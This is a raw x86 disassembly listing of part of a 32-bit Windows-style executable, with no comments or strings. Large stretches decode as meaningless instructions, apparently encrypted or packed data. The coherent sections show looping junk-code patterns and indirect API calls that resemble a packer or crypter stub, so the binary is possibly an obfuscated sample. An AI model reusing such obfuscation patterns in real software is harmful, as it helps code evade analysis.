  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx+0x19b3c15c],0xf8
  40315f:	dec    edx
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x403175
  403169:	sahf   
  40316a:	push   cs
  40316b:	or     eax,0x101b503f
  403170:	xor    dh,ch
  403172:	out    0x3c,eax
  403174:	ja     0x40319e
  403176:	loop   0x4030f9
  403178:	loop   0x40317d
  40317a:	sbb    ecx,DWORD PTR [eax-0x77f422d3]
  403180:	mov    fs,WORD PTR [edx-0x7d44f014]
  403186:	cmp    DWORD PTR [edi-0x5d],0x1605422b
  40318d:	jle    0x4031e5
  40318f:	neg    DWORD PTR [eax]
  403191:	icebp  
  403192:	(bad)  
  403193:	fstp   DWORD PTR [edi+0x769c535b]
  403199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40319a:	cmp    DWORD PTR [esi+0x3926048f],esi
  4031a0:	push   ss
  4031a1:	inc    edx
  4031a2:	jecxz  0x403130
  4031a4:	jae    0x4031fa
  4031a6:	inc    edx
  4031a7:	inc    eax
  4031a8:	int3   
  4031a9:	inc    edi
  4031aa:	bound  ebp,QWORD PTR [esi+0x78951136]
  4031b0:	jle    0x40315d
  4031b2:	adc    al,0x59
  4031b4:	mov    eax,ds:0xe4c336b6
  4031b9:	xchg   edx,eax
  4031ba:	push   esp
  4031bb:	outs   dx,DWORD PTR ds:[esi]
  4031bc:	fdiv   st,st(5)
  4031be:	shl    BYTE PTR [ebx],0x18
  4031c1:	in     eax,0xc
  4031c3:	cmp    ebp,edx
  4031c5:	and    eax,0x88e5ccf6
  4031ca:	je     0x4031f9
  4031cc:	adc    al,0x1d
  4031ce:	xor    DWORD PTR [eax+0x5d95d070],ebp
  4031d4:	dec    eax
  4031d5:	pop    ebx
  4031d6:	xchg   edx,eax
  4031d7:	sar    ch,1
  4031d9:	mov    ds:0x8f62f204,al
  4031de:	iret   
  4031df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031e0:	ins    BYTE PTR es:[edi],dx
  4031e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e3:	jge    0x403222
  4031e5:	ja     0x403212
  4031e7:	push   0x61
  4031e9:	jmp    0x92e1:0x9a4080f8
  4031f0:	enter  0x1e70,0x2
  4031f4:	ds popaw 
  4031f7:	adc    eax,0x7d45a4ce
  4031fc:	mov    eax,ds:0xdb37e0d0
  403201:	mov    DWORD PTR [eax-0x4cc030c],ebx
  403207:	sub    eax,esi
  403209:	add    ch,BYTE PTR [edi+0x7d52a432]
  40320f:	test   BYTE PTR [eax-0x63c2f863],dl
  403215:	pop    ss
  403216:	jmp    DWORD PTR [eax+0x40782107]
  40321c:	pusha  
  40321d:	ja     0x403268
  40321f:	pop    eax
  403220:	cmp    esi,ecx
  403222:	ret    
  403223:	es pop esi
  403225:	push   ecx
  403226:	xor    bl,BYTE PTR ds:0xadedc65a
  40322c:	ror    DWORD PTR fs:[eax+edx*2+0xbc2620f],1
  403234:	mov    esi,0x55169044
  403239:	aad    0xce
  40323b:	cmp    bh,BYTE PTR [ebp+0x3b]
  40323e:	iret   
  40323f:	push   ds
  403240:	ins    BYTE PTR es:[edi],dx
  403241:	in     eax,dx
  403242:	imul   ebx,DWORD PTR [ebx],0x5a617373
  403248:	jnp    0x4031f7
  40324a:	out    0x50,eax
  40324c:	jmp    0x24f9bab
  403251:	fst    DWORD PTR [ebx+0x796df8d1]
  403257:	or     DWORD PTR [edx+esi*8+0x79],eax
  40325b:	stc    
  40325c:	leave  
  40325d:	sub    ebx,DWORD PTR [edi+0x1c]
  403260:	jns    0x403221
  403262:	ret    
  403263:	pop    edi
  403264:	pop    ds
  403265:	push   esp
  403266:	rep stos BYTE PTR es:[edi],al
  403268:	clc    
  403269:	call   0x721:0xe23dea0e
  403270:	sbb    al,0xac
  403272:	aam    0xc8
  403274:	js     0x403216
  403276:	out    dx,al
  403277:	xchg   esp,eax
  403278:	jg     0x403206
  40327a:	xor    al,0xf6
  40327c:	gs jno 0x403237
  40327f:	jp     0x4032d4
  403281:	xchg   ebp,eax
  403282:	(bad)  
  403283:	mov    bh,0x5
  403285:	out    0x8d,eax
  403287:	cmp    al,0xf6
  403289:	je     0x40321a
  40328b:	jo     0x40322d
  40328d:	retw   0x774c
  403291:	and    eax,DWORD PTR gs:[ecx+ebx*1+0x4e4a20dc]
  403299:	xor    ah,BYTE PTR [eax-0x1c81ab3b]
  40329f:	and    al,0x96
  4032a1:	jno    0x40326b
  4032a3:	mov    edx,0xe0e38dc3
  4032a8:	ins    BYTE PTR es:[edi],dx
  4032a9:	(bad)  
  4032aa:	fcomp  DWORD PTR [ebp+0x47a7c156]
  4032b0:	adc    al,cl
  4032b2:	lods   al,BYTE PTR ds:[esi]
  4032b3:	daa    
  4032b4:	sub    dl,BYTE PTR [edi-0x79]
  4032b7:	fst    QWORD PTR [ebx]
  4032b9:	in     eax,dx
  4032ba:	fstp   DWORD PTR [edx]
  4032bc:	mov    al,ds:0xb5b952b8
  4032c1:	mov    ?,WORD PTR [esi+0x7ea5ed82]
  4032c7:	or     DWORD PTR [edi+eax*2+0x5b0f76de],ebx
  4032ce:	or     DWORD PTR [ecx],esp
  4032d0:	jae    0x403318
  4032d2:	mov    ecx,0xf9d56bda
  4032d7:	mov    ds:0xce9a2d1,al
  4032dc:	jge    0x4032a3
  4032de:	push   0x44
  4032e0:	dec    esi
  4032e1:	enter  0xa54a,0xb2
  4032e5:	jno    0x4032e6
  4032e7:	add    bh,BYTE PTR [edi]
  4032e9:	jmp    0xc3c9:0x5b5eef11
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4337db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4337db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4337db,ecx
  40331d:	cmp    DWORD PTR ds:0x4337db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4337db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43386f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433857,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43379f
  40336b:	add    DWORD PTR ds:0x433783,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4337d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4337d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4337d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4337d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4337d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4337d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4337d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4337d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433867
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4337c7
  4033f2:	mov    edi,DWORD PTR ds:0x433807
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4337e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4337e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4337e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4337e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4337e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4337e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4337e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4337e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433863
  403467:	and    edx,DWORD PTR ds:0x433897
  40346d:	mov    DWORD PTR ds:0x433863,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43381b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43389f
  40349f:	adc    DWORD PTR ds:0x43377f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433897,0x10
  4034c6:	cmp    DWORD PTR ds:0x433897,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433897,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433897,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433897
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433897,edi
  403505:	mov    edi,DWORD PTR ds:0x433897
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433897,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4338ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x2683d48a]
  403537:	push   0xffffffeb
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	sbb    eax,0x84a1a1f9
  403546:	xor    dl,dl
  403548:	mov    ecx,0xe560310a
  40354d:	sub    ah,ch
  40354f:	xchg   edx,eax
  403550:	dec    ebp
  403551:	cmp    eax,0x1c69de87
  403556:	daa    
  403557:	lds    edi,FWORD PTR [ebp-0x4d7d207f]
  40355d:	pop    edx
  40355e:	or     bh,ah
  403560:	retf   0x20a4
  403563:	pop    ss
  403564:	fwait
  403565:	inc    eax
  403566:	xlat   BYTE PTR ds:[ebx]
  403567:	stos   DWORD PTR es:[edi],eax
  403568:	gs inc eax
  40356a:	ds sub ah,al
  40356d:	jp     0x40358d
  40356f:	lds    edx,FWORD PTR [ebp+ecx*8-0x34]
  403573:	push   esi
  403574:	xchg   ebx,eax
  403575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403576:	pop    es
  403577:	sub    eax,0x59b1746a
  40357c:	outs   dx,BYTE PTR ds:[esi]
  40357d:	xchg   ebp,eax
  40357e:	push   edx
  40357f:	rol    ebp,cl
  403581:	mov    eax,ds:0x7d3278d4
  403586:	ins    BYTE PTR es:[edi],dx
  403587:	int    0x55
  403589:	push   ds
  40358a:	fnstsw WORD PTR [ecx-0x2bda4226]
  403590:	(bad)  
  403591:	push   esp
  403592:	xor    ebp,eax
  403594:	in     eax,0x65
  403596:	xchg   esi,eax
  403597:	add    BYTE PTR ds:0xd809dd77,al
  40359d:	push   di
  40359f:	add    dh,ch
  4035a1:	jae    0x40357d
  4035a3:	adc    eax,0xf7d12237
  4035a8:	and    edi,edi
  4035aa:	stos   BYTE PTR es:[edi],al
  4035ab:	ficomp DWORD PTR [edi]
  4035ad:	jp     0x40356b
  4035af:	inc    eax
  4035b0:	retf   
  4035b1:	popf   
  4035b2:	es in  ax,0x5
  4035b6:	or     eax,0xa59f212c
  4035bb:	and    al,0xca
  4035bd:	xor    edi,DWORD PTR [esi+eax*2-0x5c]
  4035c1:	clc    
  4035c2:	ins    BYTE PTR es:[edi],dx
  4035c3:	xor    BYTE PTR ds:0xb64a1946,ah
  4035c9:	push   ebp
  4035ca:	add    eax,0x13fa1a9e
  4035cf:	outs   dx,BYTE PTR ds:[esi]
  4035d0:	or     BYTE PTR [edx+0x3e86fbf2],ah
  4035d6:	add    DWORD PTR [ebx-0x75a2c758],eax
  4035dc:	sub    BYTE PTR [ebx+0x7f],0x95
  4035e0:	cmp    DWORD PTR [ecx+0x3f0514ea],ecx
  4035e6:	sub    eax,0x7fee5652
  4035eb:	xor    BYTE PTR [edx],cl
  4035ed:	adc    ebp,edi
  4035ef:	mov    esp,0x979710b
  4035f4:	pushf  
  4035f5:	scas   al,BYTE PTR es:[edi]
  4035f6:	jge    0x4035ab
  4035f8:	int    0xa7
  4035fa:	iret   
  4035fb:	push   cs
  4035fc:	mov    ah,0xa0
  4035fe:	imul   ecx,DWORD PTR [esi-0x384033a8],0x2b266f88
  403608:	neg    BYTE PTR [edi+0x900bc49]
  40360e:	mov    al,dh
  403610:	rcl    BYTE PTR [esi+0x45251773],1
  403616:	push   edx
  403617:	adc    al,BYTE PTR fs:[edx]
  40361a:	nop
  40361b:	cmc    
  40361c:	xchg   edi,eax
  40361d:	test   eax,0xbb2ddacc
  403622:	adc    DWORD PTR [edi-0x139958b1],esi
  403628:	xchg   sp,ax
  40362a:	sbb    bl,BYTE PTR gs:[ecx+esi*4]
  40362e:	dec    esi
  40362f:	xchg   esi,eax
  403630:	or     BYTE PTR [esi-0x15182c2e],ch
  403636:	and    ebx,DWORD PTR [edx-0x6867c60b]
  40363c:	and    DWORD PTR [ebp+edx*4-0x443c9a05],edi
  403643:	mov    esi,DWORD PTR [edx+eax*1-0x2e]
  403647:	add    BYTE PTR [edi+ebx*1],dh
  40364a:	adc    DWORD PTR [eax],ebp
  40364c:	jp     0x40364c
  40364e:	ss push ecx
  403650:	or     eax,DWORD PTR [ecx]
  403652:	or     al,al
  403654:	and    edi,edx
  403656:	out    dx,eax
  403657:	xor    ebp,DWORD PTR [eax+0x1e]
  40365a:	xchg   ebx,eax
  40365b:	call   0x3344:0x1093944e
  403662:	mov    bl,0x22
  403664:	sbb    ecx,eax
  403666:	mov    bl,0x77
  403668:	inc    edi
  403669:	push   ss
  40366a:	pop    ecx
  40366b:	cld    
  40366c:	(bad)  
  40366d:	(bad)  
  40366f:	sar    BYTE PTR [ebx+0x4a698371],cl
  403675:	aad    0x28
  403677:	test   al,0x9f
  403679:	mov    ebp,0xc447cb71
  40367e:	es jo  0x403602
  403681:	jmp    ebx
  403683:	adc    ebp,DWORD PTR [ebp+0x21]
  403686:	(bad)  
  403687:	shl    BYTE PTR [eax-0x16],cl
  40368a:	push   edx
  40368b:	xchg   BYTE PTR ds:0xd6e3f5cf,bh
  403691:	adc    DWORD PTR [ebx-0x792bfd7b],eax
  403697:	fs push edx
  403699:	push   ebx
  40369a:	cld    
  40369b:	aam    0x6c
  40369d:	fdiv   st(3),st
  40369f:	xor    DWORD PTR [ebp+0x14],esp
  4036a2:	push   ebp
  4036a3:	out    0x25,al
  4036a5:	gs or  al,0x97
  4036a8:	add    ebx,ebx
  4036aa:	cmp    BYTE PTR ds:0x6d7fcff1,al
  4036b0:	popa   
  4036b1:	lds    ebp,FWORD PTR [ebx]
  4036b3:	jge    0x4036f6
  4036b5:	dec    edx
  4036b6:	dec    ebp
  4036b7:	fwait
  4036b8:	push   0xffffffcb
  4036ba:	push   eax
  4036bb:	or     al,0x1c
  4036bd:	mov    dl,0x1e
  4036bf:	sub    ch,bl
  4036c1:	test   eax,0x3491edcb
  4036c6:	fabs   
  4036c8:	loope  0x403676
  4036ca:	mov    ah,0x32
  4036cc:	jecxz  0x403672
  4036ce:	dec    edx
  4036cf:	jp     0x4036c9
  4036d1:	or     al,0x15
  4036d3:	jmp    0x3e4e:0xbb2342da
  4036da:	add    al,0x61
  4036dc:	adc    esp,DWORD PTR [edi]
  4036de:	bound  ecx,QWORD PTR [edi]
  4036e0:	sub    dl,BYTE PTR [ecx+eiz*2+0xa]
  4036e4:	ror    DWORD PTR [ecx],1
  4036e6:	mov    ds,WORD PTR [ebp-0x28ccef90]
  4036ec:	clc    
  4036ed:	shl    BYTE PTR [ecx+0x55],1
  4036f0:	retf   0x7bc8
  4036f3:	mov    esp,0x2890caff
  4036f8:	sti    
  4036f9:	jbe    0x4036a6
  4036fb:	in     eax,0x4c
  4036fd:	addr16 or al,0x45
  403700:	xchg   esp,eax
  403701:	inc    esi
  403702:	sub    eax,0xe92e30d1
  403707:	pushf  
  403708:	stos   BYTE PTR es:[edi],al
  403709:	and    BYTE PTR [edx],bl
  40370b:	or     DWORD PTR [esi+0x76c86623],edi
  403711:	pop    esp
  403712:	lods   eax,DWORD PTR ds:[esi]
  403713:	bound  esp,QWORD PTR [edx]
  403715:	int3   
  403716:	imul   edx,DWORD PTR [eax],0x3e
  403719:	lea    ebp,[ebx]
  40371b:	fld    TBYTE PTR ss:[ecx-0x26e6ad08]
  403722:	retf   0x9860
  403725:	mov    esi,0xda37851c
  40372a:	stos   BYTE PTR es:[edi],al
  40372b:	aas    
  40372c:	scas   eax,DWORD PTR es:[edi]
  40372d:	jle    0x4036bb
  40372f:	pop    esi
  403730:	mov    ah,BYTE PTR [esi+eax*1-0x31]
  403734:	repnz or al,0x25
  403737:	scas   al,BYTE PTR es:[edi]
  403738:	xor    al,0xd5
  40373a:	stos   BYTE PTR es:[edi],al
  40373b:	add    ch,BYTE PTR [edx]
  40373d:	push   esi
  40373e:	pop    esi
  40373f:	pand   mm3,QWORD PTR [edx-0x26a85bee]
  403746:	xchg   ecx,eax
  403747:	cmp    BYTE PTR [ebx-0x345011e1],dh
  40374d:	pusha  
  40374e:	cmp    ch,dl
  403750:	das    
  403751:	xor    eax,0x8c9e4630
  403756:	add    eax,0x56bd3368
  40375b:	sbb    BYTE PTR [ebx+edi*2+0xd235f24],dh
  403762:	leave  
  403763:	jbe    0x403784
  403765:	sbb    ebp,esp
  403767:	pop    ss
  403768:	dec    ebp
  403769:	jo     0x4036fe
  40376b:	cs lock xchg esi,eax
  40376e:	and    eax,0x618d648b
  403773:	imul   BYTE PTR ds:0x76c2191e
  403779:	outs   dx,DWORD PTR ds:[esi]
  40377a:	daa    
  40377b:	pop    esi
  40377c:	sar    bh,0x11
  40377f:	mov    ds:0xb23ccbe0,eax
  403784:	pop    es
  403785:	test   al,0xd5
  403787:	outs   dx,BYTE PTR ds:[esi]
  403788:	das    
  403789:	mov    ds:0xf1765b89,eax
  40378e:	adc    esi,DWORD PTR [eax+0x1]
  403791:	scas   eax,DWORD PTR es:[edi]
  403792:	inc    ebp
  403793:	xchg   DWORD PTR [edi-0xe],ebx
  403796:	imul   ebx,DWORD PTR [ebx],0x4d
  403799:	int    0x48
  40379b:	outs   dx,DWORD PTR ds:[esi]
  40379c:	jl     0x4037d3
  40379e:	cmp    al,dh
  4037a0:	push   ss
  4037a1:	push   esp
  4037a2:	mov    ch,0x5b
  4037a4:	xor    ah,BYTE PTR [esp+ecx*8-0x6f11a717]
  4037ab:	mov    eax,0x2fa8372f
  4037b0:	cdq    
  4037b1:	jmp    0xe315d34a
  4037b6:	test   al,0xac
  4037b8:	push   0xffffffb4
  4037ba:	fistp  WORD PTR [ecx+0x358153a3]
  4037c0:	int3   
  4037c1:	stos   BYTE PTR es:[edi],al
  4037c2:	push   ss
  4037c3:	rcr    BYTE PTR [eax],0xec
  4037c6:	mov    cs:0x40582e27,eax
  4037cc:	into   
  4037cd:	jle    0x403775
  4037cf:	mov    al,0x5b
  4037d1:	mov    ecx,0xbec8c307
  4037d6:	rcr    eax,0x55
  4037d9:	cwde   
  4037da:	sub    ch,BYTE PTR [esi+0x40154e3b]
  4037e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037e1:	fcmovu st,st(5)
  4037e3:	pop    esi
  4037e4:	jbe    0x4037ed
  4037e6:	inc    ecx
  4037e7:	ficom  WORD PTR [edi-0x37]
  4037ea:	sbb    al,0x38
  4037ec:	shl    DWORD PTR [ebp+0x5633f458],0x8a
  4037f3:	xchg   edx,eax
  4037f4:	jne    0x403778
  4037f6:	lds    ebx,FWORD PTR [ecx]
  4037f8:	pop    eax
  4037f9:	sahf   
  4037fa:	fimul  WORD PTR [eax]
  4037fc:	dec    edi
  4037fd:	and    DWORD PTR [ebp+0xa],edi
  403800:	xchg   ebx,eax
  403801:	popa   
  403802:	rol    DWORD PTR [edi],1
  403804:	sbb    BYTE PTR [ebp-0x31],al
  403807:	and    DWORD PTR [ebp-0x61],edx
  40380a:	std    
  40380b:	repnz mov edi,ss
  40380e:	pop    esi
  40380f:	sub    BYTE PTR [ebp+0x6f],dh
  403812:	inc    ecx
  403813:	mov    ch,0x9b
  403815:	jle    0x40380d
  403817:	sbb    bh,ah
  403819:	or     al,0x24
  40381b:	cli    
  40381c:	push   cs
  40381d:	mov    ch,0x3a
  40381f:	jmp    0x403830
  403821:	dec    ebp
  403822:	jmp    FWORD PTR [ebx-0x387a0337]
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x377b3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	sub    edi,DWORD PTR [eax]
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x4338a725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x4338a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4338a7,edi
  403858:	cmp    DWORD PTR ds:0x4338a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4338a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4338a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4338a7,edi
  40389c:	cmp    DWORD PTR ds:0x4338a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4337eb,0x4338ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433813,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43386b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4338a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43386b,0x43382b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43377b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433797,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433793,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43389b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43377f,0x1d
  403935:	cmp    DWORD PTR ds:0x43377f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43377f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43377f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43377f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43377f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43377f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43377f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4337e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433793
  4039a6:	sub    edi,DWORD PTR ds:0x4338a3
  4039ac:	mov    DWORD PTR ds:0x433793,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433787,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433787,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433787,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433787
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433787,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433797
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43377b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43377b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43377b,ebx
  403a19:	cmp    DWORD PTR ds:0x43377b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43377b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433857,0x19
  403a4c:	cmp    DWORD PTR ds:0x433857,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433857,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433857
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433857,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43389b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403b2b
  403acb:	sub    bh,ah
  403acd:	sub    al,0x20
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403ac7
  403ad7:	dec    ebp
  403ad8:	pop    ss
  403ad9:	(bad)  
  403ada:	sbb    eax,0x9569e34e
  403adf:	mov    al,0x85
  403ae1:	repnz or ebp,DWORD PTR [eax]
  403ae4:	inc    ebp
  403ae5:	xchg   ebp,eax
  403ae6:	sub    al,0xea
  403ae8:	hlt    
  403ae9:	push   ebx
  403aea:	retf   
  403aeb:	mov    ecx,0x9499dfaa
  403af0:	cs mov bl,ch
  403af3:	push   esp
  403af4:	xor    BYTE PTR [ebx-0x5e],ah
  403af7:	loope  0x403b77
  403af9:	adc    al,ah
